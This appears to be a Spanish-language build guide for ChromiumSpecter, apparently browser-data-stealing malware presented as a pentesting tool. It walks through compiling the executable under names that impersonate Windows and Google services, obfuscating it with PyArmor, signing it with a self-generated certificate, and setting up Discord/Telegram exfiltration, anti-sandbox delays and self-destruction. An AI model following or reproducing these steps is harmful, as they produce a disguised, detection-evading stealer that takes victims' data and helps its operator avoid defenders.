# ⚙️ Flujos de Compilación Profesional

> [!NOTE]
> [English Version](COMPILATION_FLOWS.en.md) | **Versión en Español**

Esta guía detalla los dos flujos de trabajo recomendados para generar el ejecutable final de **ChromiumSpecter**, cubriendo tanto entornos híbridos como entornos puros de Linux/WSL.

---

## 🏗️ Flujo A: Híbrido (Windows + WSL/Linux)

**Recomendado por: Máxima estabilidad y facilidad de uso.**

Este flujo utiliza Windows para la parte pesada de compilación (donde las APIs nativas están presentes) y WSL/Linux para la parte de seguridad y sigilo (firma digital).

### 1. Preparación en Windows (PowerShell)

Instala las dependencias necesarias:

```powershell
pip install pyarmor pyinstaller -r requirements.txt
```

### 2. Compilación del binario (Windows)

Generate the `.exe` using the automation script with identity spoofing (e.g., mimicking a Windows service):

```powershell
python build.py --name "WinSecurityHealth" --preset microsoft --onefile --noconsole
```

*El resultado estará en `dist/ChromiumSpecter.exe`.*

### 3. Firma Digital (WSL/Linux)

Copia el archivo a tu entorno WSL y ejecuta el script de certificación:

```bash
bash autocert.sh dist/ChromiumSpecter.exe "TuContraseñaSegura"
```

---

## 🏗️ Flujo B: Puro (WSL/Linux con Wine)

**Recomendado para: Pentesting desde entornos aislados o distribuciones como Kali Linux.**

Este flujo permite generar un ejecutable de Windows sin salir de Linux, emulando el entorno de Windows mediante Wine.

### 1. Configuración del Prefijo Wine

Crea un entorno de 64 bits limpio para evitar conflictos:

```bash
export WINEPREFIX=$HOME/.wine_chromium
export WINEARCH=win64
winecfg  # Cerciórate de que la versión de Windows sea 'Windows 10'
```

### 2. Instalación de Python para Windows en Wine

Descarga el instalador oficial de Windows (`python-3.x-amd64.exe`) desde python.org y ejecútalo:

```bash
wine python-3.11.x-amd64.exe /quiet InstallAllUsers=1 PrependPath=1
```

### 3. Instalación de Dependencias dentro de Wine

Usa el `pip` emulado para instalar las librerías de Windows:

```bash
wine python -m pip install --upgrade pip
wine python -m pip install pycryptodomex pywin32 requests pyarmor pyinstaller
```

> [!IMPORTANT]
> Si `pywin32` falla, ejecuta este comando post-instalación:
> `wine python Scripts/pywin32_postinstall.py -install`

### 4. Compilación Metamórfica

Ejecuta el proceso completo bajo Wine:

```bash
wine python ofuscator.py main.py
wine python build.py --name "GoogleUpdate" --preset google --onefile --noconsole
```

### 5. Firma In-Situ

Firma el binario directamente desde tu terminal de Linux:

```bash
bash autocert.sh dist/ChromiumSpecter.exe
```

## 🎛️ Flujo C: Dashboard Builder (Recomendado)

Este es el método más sencillo y potente, utilizando la interfaz gráfica integrada para configurar y generar el ejecutable.

### Pasos

1. **Tab de Exfiltración**: Configura y verifica tus canales (Discord/Telegram). Guarda la configuración.
2. **Tab de Compilación (Builder)**:
    * **Metadatos**: Define el nombre del ejecutable, empresa, versión e ícono.
    * **Sigilo**: Configura los Delays (Anti-Sandbox) y el Timeout de Webhooks.
    * **Opciones**: Activa **Ofuscación (PyArmor)** para máxima protección o **Autodestrucción** para borrar el rastro.
3. **Build**: Presiona `🔨 INICIAR COMPILACIÓN`. El Dashboard usará su motor interno para generar el archivo en la carpeta `dist/`.

> [!TIP]
> El Dashboard Master lleva su propio motor de compilación inyectado. Esto permite generar stubs incluso si no tienes Python instalado en el sistema global.

---

## 🛡️ Comparativa de Flujos

| Característica | Flujo A (Híbrido) | Flujo B (Wine) | Flujo C (Dashboard) |
| :--- | :--- | :--- | :--- |
| **Estabilidad** | ⭐ Excelente | ⚠️ Moderada | ⭐ Excelente |
| **Simplicidad** | ⭐ Alta | ⚠️ Baja | 🏆 Máxima |
| **Aislamiento** | ❌ Bajo | ⭐ Alto | 🟡 Medio |
| **Tamaño de Build** | ~18 MB | ~18 MB | ~18 MB |
| **Portabilidad** | Media (Repo) | Alta (Linux) | 🚀 Total (Standalone) |

---

## ⚖️ Recomendación de Pentesting

Si estás operando desde una máquina de ataque (Kali Linux), el **Flujo B** te permite mantener toda tu cadena de suministro (supply chain) dentro de Linux, minimizando la exposición de tus herramientas de desarrollo en sistemas Windows que podrían estar monitoreados.

---
